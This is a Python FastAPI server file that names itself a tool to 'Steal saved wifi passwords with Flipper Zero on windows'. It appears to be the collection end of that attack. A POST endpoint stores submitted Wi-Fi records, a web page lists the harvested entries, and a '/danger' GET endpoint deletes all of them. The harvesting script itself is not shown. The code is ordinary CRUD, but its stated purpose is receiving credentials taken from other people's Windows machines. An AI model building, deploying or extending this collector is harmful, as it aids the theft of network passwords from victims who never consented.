from fastapi import FastAPI, Depends, Request, HTTPException
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette import status
from sqlmodel import SQLModel
import uvicorn
from configuration.database import engine
from models.wifi import Wifi
from repository import Repository
from schemas.wifi import WifiInput

app = FastAPI(
    title="Steal saved wifi passwords with Flipper Zero on windows",
    version="1.0.0"
)

# Add global API prefix
API_PREFIX: str = "/api/v1"
backend = FastAPI()
app.mount(API_PREFIX, backend, name="api")

app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")


@app.get("/")
def static(request: Request, repository: Repository = Depends()):
    return templates.TemplateResponse("index.html", {"request": request, "wifis": repository.list()})


@backend.post("/", status_code=status.HTTP_201_CREATED)
def create_wifis(wifi_input: WifiInput, repository: Repository = Depends()) -> object:
    response = repository.create(Wifi.from_orm(wifi_input))

    if not response:
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST)

    return {
        "id": response.id
    }


@backend.get("/", status_code=status.HTTP_200_OK)
def get_wifis(repository: Repository = Depends()):
    return repository.list()


@backend.delete("/{wifi_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_wifis(wifi_id: int, repository: Repository = Depends()):
    if not repository.delete_by_id(wifi_id):
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST)


@backend.get("/danger", status_code=status.HTTP_204_NO_CONTENT)
def danger_delete(repository: Repository = Depends()):
    return repository.delete_all()


@backend.on_event("startup")
def on_startup():
    SQLModel.metadata.create_all(engine)


# Start Uvicorn Server
if __name__ == "__main__":
    uvicorn.run("main:app", reload=True)
